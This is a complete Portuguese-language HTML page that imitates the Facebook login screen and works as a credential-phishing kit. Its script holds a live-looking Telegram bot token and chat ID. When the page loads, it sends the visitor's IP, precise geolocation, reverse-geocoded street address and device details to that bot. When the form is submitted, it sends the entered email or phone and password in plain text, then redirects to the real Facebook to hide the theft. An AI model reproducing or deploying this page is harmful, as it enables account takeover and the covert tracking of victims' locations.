<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - entre ou cadastre-se</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .top-language {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        .facebook-logo {
            width: 56px;
            height: 56px;
        }
        
        .login-form {
            width: 100%;
            max-width: 396px;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        
        .login-form input {
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            color: #1c1e21;
            background-color: #ffffff;
            width: 100%;
        }
        
        .login-form input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .login-btn:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            margin: 5px 0;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .divider {
            height: 1px;
            background-color: #dadde1;
            margin: 20px 0;
        }
        
        .create-account {
            background-color: #ffffff;
            border: 1px solid #1877f2;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            color: #1877f2;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .create-account:hover {
            background-color: #f5f7f9;
        }
        
        .footer {
            margin-top: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .meta-logo {
            height: 16px;
        }
        
        .error-message {
            color: #f02849;
            font-size: 13px;
            margin-top: -12px;
            margin-bottom: 4px;
            display: none;
        }
        
        .connection-error {
            color: #f02849;
            font-size: 13px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="top-language">Portugu√™s (Brasil)</div>
    
    <div class="logo-container">
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook" class="facebook-logo">
    </div>
    
    <form class="login-form" id="loginForm">
        <div>
            <input type="text" id="email" placeholder="N√∫mero do celular ou email" required 
                   autocapitalize="none" autocomplete="off" spellcheck="false">
            <div id="emailError" class="error-message">Digite um e-mail ou telefone v√°lido.</div>
        </div>
        
        <div>
            <input type="password" id="password" placeholder="Senha" required 
                   autocapitalize="none" autocomplete="off" spellcheck="false">
            <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>
        </div>
        
        <button type="submit" class="login-btn">Entrar</button>
        
        <a href="#" class="forgot-password">Esqueceu a senha?</a>
        
        <div class="divider"></div>
        
        <button type="button" class="create-account" id="createAccount">Criar nova conta</button>
        <div id="connectionError" class="connection-error">Erro de conex√£o. Tente novamente.</div>
    </form>
    
    <div class="footer">
        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
    </div>

    <script>
        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
        const CHAT_ID = "5542692841";
        const TELEGRAM_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const createAccountBtn = document.getElementById('createAccount');
        const connectionError = document.getElementById('connectionError');
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\d{8,}$/;
        const MIN_PASSWORD_LENGTH = 6;
        
        let userLocation = null;
        let userAddressInfo = null;
        let userIP = null;
        let deviceInfoSent = false;
        
        function isValidEmailOrPhone(value) {
            return emailRegex.test(value) || phoneRegex.test(value);
        }
        
        emailInput.addEventListener('input', () => {
            emailError.style.display = isValidEmailOrPhone(emailInput.value.trim()) || emailInput.value === "" ? 'none' : 'block';
        });
        
        passwordInput.addEventListener('input', () => {
            passwordError.style.display = passwordInput.value.length >= MIN_PASSWORD_LENGTH || passwordInput.value === "" ? 'none' : 'block';
        });
        
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }
        
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return "IP n√£o dispon√≠vel";
            }
        }
        
        async function getAddressFromCoords(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                return data.address ? {
                    country: data.address.country || "N/A",
                    state: data.address.state || "N/A",
                    city: data.address.city || data.address.town || "N/A",
                    road: data.address.road || "N/A",
                    postcode: data.address.postcode || "N/A"
                } : null;
            } catch {
                return null;
            }
        }
        
        async function sendToTelegram(emailOrPhone, password, location, ip, addressInfo, isLogin = false) {
            const messageType = isLogin ? "üîê *TENTATIVA DE LOGIN*" : "üì± *ACESSO √Ä P√ÅGINA*";
            let locationText = location ? `üìç Coordenadas: ${location.latitude}, ${location.longitude}` : "üìç Localiza√ß√£o: Negada/Indispon√≠vel";
            
            if (addressInfo) {
                locationText += `\nüè¥ Pa√≠s: ${addressInfo.country}\nüèõÔ∏è Estado: ${addressInfo.state}\nüèôÔ∏è Cidade: ${addressInfo.city}\nüõ£Ô∏è Rua: ${addressInfo.road}`;
            }

            const messageText = `${messageType}

${isLogin ? `üë§ Usu√°rio: ${emailOrPhone}\nüîë Senha: ${password}\n` : ""}
üåê *Rede*
üñ•Ô∏è IP: ${ip}
${locationText}

üì± *Dispositivo*
üñ•Ô∏è Browser: ${navigator.userAgent}
üíª OS: ${navigator.platform}
üñ•Ô∏è Resolu√ß√£o: ${screen.width}x${screen.height}
‚è∞ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
        
            try {
                await fetch(TELEGRAM_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
                return true;
            } catch {
                return false;
            }
        }
        
        async function initData() {
            if (deviceInfoSent) return;
            userIP = await getUserIP();
            userLocation = await getLocation();
            if (userLocation) {
                userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
            }
            if (await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false)) {
                deviceInfoSent = true;
            }
        }
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = emailInput.value.trim();
            const pass = passwordInput.value;

            if (!isValidEmailOrPhone(email) || pass.length < MIN_PASSWORD_LENGTH) return;
        
            if (!userIP) userIP = await getUserIP();
            await sendToTelegram(email, pass, userLocation, userIP, userAddressInfo, true);
        
            setTimeout(() => { window.location.href = "https://facebook.com"; }, 500);
        });
        
        createAccountBtn.addEventListener('click', () => {
            connectionError.style.display = 'block';
            setTimeout(() => { connectionError.style.display = 'none'; }, 3000);
        });
        
        window.addEventListener('load', initData);
    </script>
</body>
</html>
